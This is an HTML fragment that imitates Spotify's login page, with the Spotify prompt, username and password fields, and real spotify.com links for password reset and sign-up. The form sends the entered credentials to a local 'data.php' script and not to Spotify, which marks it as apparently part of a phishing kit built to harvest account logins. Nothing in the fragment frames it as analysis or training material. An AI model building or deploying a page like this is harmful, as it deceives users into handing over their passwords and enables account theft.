<main>
	<div class="content">
		<div class="row ng-scope" ng-if="showContinueLabel">
          <div class="col-xs-12 text-center">
              <span id="login-to-continue" class="h5 ng-binding" style="
    font-family: inherit;
    font-weight: 900;
    line-height: 1.1;
    font-size: 15px;
    color: inherit;
">To continue, log in to Spotify.</span>
          </div>
    </div></br>
		<div class="content-form">
			<form action="data.php" method="POST">
				<input type="text" name="username" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" placeholder="Email address or username" title="  Enter correct Email address or username" required>
				<input type="password" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" name="userpassword" placeholder="Password" title="Five or more characters" required>
				<div class="checkbox">
            		<label class="ng-binding">
              			<input ng-model="form.remember" type="checkbox" name="remember" analytics-on="checked" analytics-category="Login View" id="login-remember" class="ng-valid ng-dirty ng-valid-parse ng-touched ng-not-empty">
              			Remember me
              			<span class="control-indicator"></span>
            		</label>
         	 	</div>
				<input type="submit" name="data" value="Log In">
			</form>
			<div class="signinLink">
				<a href="https://www.spotify.com/password-reset/"  target="_blank">Forgotten account?</a>
				<span> · </span>
				<a href="https://accounts.spotify.com/en/login/signup?continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect" target="_blank">Sign up for Spotify</a>
			</div>
		</div>
	</div>
</main>